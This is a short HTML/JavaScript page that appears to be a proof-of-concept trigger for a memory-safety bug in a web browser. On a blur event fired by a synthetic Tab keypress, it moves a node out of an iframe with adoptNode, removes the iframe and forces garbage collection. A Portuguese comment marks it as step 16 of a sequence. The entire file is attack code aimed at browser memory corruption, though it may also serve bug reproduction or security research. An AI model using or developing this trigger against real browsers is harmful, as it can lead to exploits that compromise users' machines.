<!DOCTYPE html>
<html>
<body>
  <input id="outerInput">
  <iframe tabindex="0" srcdoc="<input tabindex='0'><script>parent.innerInput = document.querySelector('input');</script>"></iframe>
  <script>
    function gc() {
        function gcRec(n) {
            if (n < 1) return {};
            var temp = { i: "ab" + i + (i / 100000) };
            temp += "foo";
            gcRec(n - 1);
        }
        for (var i = 0; i < 10000; i++) gcRec(10);  
    }
    let iframe = document.querySelector('iframe');
    let outerInput = document.querySelector('input');
    let innerInput = null;

    iframe.onload = () => setTimeout(runTest, 0);

    function runTest() {
        let innerInput = window.innerInput;
        window.innerInput = null;

        // Passo 16: O evento blur dispara a rotina que move o nó, destrói o iframe e força o GC
        outerInput.addEventListener('blur', () => {
            document.adoptNode(innerInput);
            innerInput = null;
            iframe.remove();
            iframe = null;
            gc();
            console.log("Passo 16: adoptNode, remoção do iframe e gc() concluídos.");
        }, { once: true });

        outerInput.focus();
        outerInput.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true, cancelable: true, view: window, detail: 0, key: 'Tab', code: 'Tab', keyIdentifier: 'U+0009'}));
    }
  </script>
</body>
</html>
